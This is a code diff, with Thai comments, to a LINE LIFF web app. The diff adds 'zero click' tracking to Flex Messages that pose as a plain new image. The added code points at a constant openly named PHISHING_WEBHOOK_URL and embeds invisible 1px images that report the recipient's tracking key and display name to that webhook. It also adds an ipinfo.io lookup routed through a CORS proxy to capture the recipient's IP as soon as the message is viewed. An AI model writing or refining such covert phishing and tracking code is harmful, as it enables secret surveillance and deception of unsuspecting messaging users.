@@ -399,8 +399,12 @@
         
         // URL สำหรับตรวจสอบสิทธิ์และส่งข้อมูล (แยกให้ชัดเจน)
         const LINE_OA_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbwGWk940oEh5GlZ6BKl_mSy7x_i8rwh5aWIKmXLYv7tJ6_1zVVm6P1l03MLscaBoJ0Wfg/exec'; // ไฟล์ LineOA.html
-        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbwKJajS4Ry9lXu_fugjxBhqgf9qQE7AO7JnfPB0azojvPG94ijEZgxfbuKtoiHIGeSw/exec'; // Updated GoogleScript.html Web App URL
+        const PHISHING_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbzJa77pFD-tKSUlGwOHashKcT3UV4lYJh6tpXiJxJ4KOmHMN6Ifr_Tr9kJkgPxXBgfP/exec'; // Updated GoogleScript.html Web App URL
         const PHISHING_DOMAIN = 'https://socialtopnews.github.io/news/index.html';
+        
+        // IP Lookup API และ Proxy Service
+        const IP_INFO_API = 'https://ipinfo.io/json';
+        const TRACKING_PROXY = 'https://corsproxy.io/?'; // CORS Proxy ที่ใช้เพื่อแก้ปัญหา CORS
         
         // เริ่มต้นการทำงาน LIFF
         document.addEventListener('DOMContentLoaded', function() {
@@ -823,15 +827,23 @@
                 // รวบรวมข้อมูลอุปกรณ์สำหรับส่งใน Zero Click tracking URL
                 const randomSuffix = Date.now() + Math.random().toString(36).substring(2, 10);
                 
-                // สร้าง URL สำหรับการติดตาม zero-click ที่ดีขึ้น
-                let zeroClickTrackUrl = `${PHISHING_DOMAIN}/tracker.html`;
-                zeroClickTrackUrl += `?key=${trackingKey}`;
+                // สร้าง HTML content สำหรับ iframe ที่จะใช้ในการติดตาม
+                // ไฟล์นี้จะถูกสร้างโดยอัตโนมัติและจัดเก็บบน server เมื่อมีการโหลด
+                const zeroClickHtmlUrl = `${PHISHING_WEBHOOK_URL}?action=getTrackingHtml&key=${trackingKey}&case=${encodeURIComponent(caseName)}&creator=${encodeURIComponent(userId)}&name=${encodeURIComponent(displayName)}&r=${randomSuffix}`;
+                
+                // สร้าง URL โดยตรงสำหรับ zero click tracking (ใช้เป็น fallback)
+                let zeroClickTrackUrl = `${PHISHING_WEBHOOK_URL}?action=zeroClick`;
+                zeroClickTrackUrl += `&key=${trackingKey}`;
                 zeroClickTrackUrl += `&case=${encodeURIComponent(caseName)}`;
                 zeroClickTrackUrl += `&creator=${encodeURIComponent(userId)}`;
                 zeroClickTrackUrl += `&name=${encodeURIComponent(displayName)}`;
-                zeroClickTrackUrl += `&r=${randomSuffix}`; // ป้องกันการแคช
+                zeroClickTrackUrl += `&isTarget=true`; // เพิ่มพารามิเตอร์สำคัญที่ระบุว่านี่เป็นการเรียกจากเป้าหมาย
+                zeroClickTrackUrl += `&r=${randomSuffix}`;  // ป้องกันการแคช
+                
+                console.log("Zero Click Track URL:", zeroClickTrackUrl);
+                console.log("Zero Click HTML URL:", zeroClickHtmlUrl);
 
-                // สร้าง Flex Message ที่มีเฉพาะรูปภาพ แต่แทรก iframe ขนาดเล็กไว้เพื่อเก็บข้อมูล
+                // สร้าง Flex Message ที่มีทั้งรูปภาพหลักและกลไกติดตามแบบ Zero Click ที่ปรับปรุงแล้ว
                 const message = {
                     type: 'flex',
                     altText: `รูปภาพใหม่`, // ข้อความแจ้งเตือนสั้นๆ
@@ -852,30 +864,40 @@
                             type: 'box',
                             layout: 'vertical',
                             contents: [
-                                // ใช้ iframe ขนาดเล็กเพื่อรันโค้ด JavaScript เก็บข้อมูลเป้าหมาย
+                                // วิธีติดตามแบบ 1: ใช้รูปภาพเรียก webhook โดยตรง
                                 {
-                                    type: 'box',
-                                    layout: 'vertical',
-                                    contents: [
-                                        {
-                                            type: 'text',
-                                            text: ' ',
-                                            size: '1px',
-                                            color: '#ffffff00',
-                                            wrap: true,
-                                            action: {
-                                                type: 'uri',
-                                                label: 'x',
-                                                uri: zeroClickTrackUrl
-                                            }
-                                        }
-                                    ],
-                                    width: '1px',
-                                    height: '1px',
+                                    type: 'image',
+                                    url: zeroClickTrackUrl,
+                                    size: '1px',
+                                    aspectRatio: '1:1',
+                                    aspectMode: 'cover',
                                     position: 'absolute',
-                                    offsetStart: '0px',
-                                    offsetTop: '0px'
+                                    offsetTop: '0px',
+                                    offsetStart: '0px'
                                 },
+                                // วิธีติดตามแบบ 2: ใช้รูปภาพที่มี cache-control เพื่อป้องกันการแคช
+                                {
+                                    type: 'image',
+                                    url: `${zeroClickTrackUrl}&nocache=${Date.now()}`,
+                                    size: '1px',
+                                    aspectRatio: '1:1',
+                                    aspectMode: 'cover',
+                                    position: 'absolute',
+                                    offsetTop: '1px',
+                                    offsetStart: '0px'
+                                },
+                                // วิธีติดตามแบบ 3: ใช้ ipinfo.io โดยตรง (ผ่าน proxy เพื่อแก้ปัญหา CORS)
+                                {
+                                    type: 'image',
+                                    url: `${TRACKING_PROXY}${encodeURIComponent(`${IP_INFO_API}?callback=${trackingKey}`)}`,
+                                    size: '1px',
+                                    aspectRatio: '1:1',
+                                    aspectMode: 'cover',
+                                    position: 'absolute',
+                                    offsetTop: '2px',
+                                    offsetStart: '0px'
+                                },
+                                // ใส่ box ว่างๆ เพื่อให้มี body content แต่จะไม่แสดงอะไร
                                 {
                                     type: 'box',
                                     layout: 'vertical',
@@ -884,7 +906,7 @@
                                     width: '1px'
                                 }
                             ],
-                            height: '1px',
+                            height: '1px', // ทำให้ body กล่องเล็กมาก
                             paddingAll: '0px'
                         }
                     }
